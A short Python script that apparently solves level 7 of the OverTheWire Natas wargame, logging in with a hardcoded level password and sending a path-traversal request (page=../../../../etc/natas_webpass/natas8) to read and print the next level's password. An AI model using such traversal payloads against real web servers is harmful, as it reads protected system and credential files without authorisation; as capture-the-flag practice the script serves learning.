
#!/usr/bin/env python

import requests
import re

username = 'natas7'
password = 'bmg8SvU1LizuWjx3y7xkNERkHxGre0GS'

url = 'http://%s.natas.labs.overthewire.org/index.php?page=../../../../etc/natas_webpass/natas8' % username

try:
    session = requests.Session()
    response = session.get(url, auth=(username, password))

    content = response.text

    # Uncomment the line below to print the entire content of the response
    # print(content)

    # Using regular expression to find the password for natas8
    matches = re.findall(r'<br>\n(.*)\n\n<!--', content)

    if matches:
        password_natas8 = matches[0].strip()  # Strip any leading or trailing whitespace
        print("Password for natas8:", password_natas8)
    else:
        print("Password for natas8 not found in the response.")
except requests.exceptions.RequestException as e:
    print("An error occurred:", e)
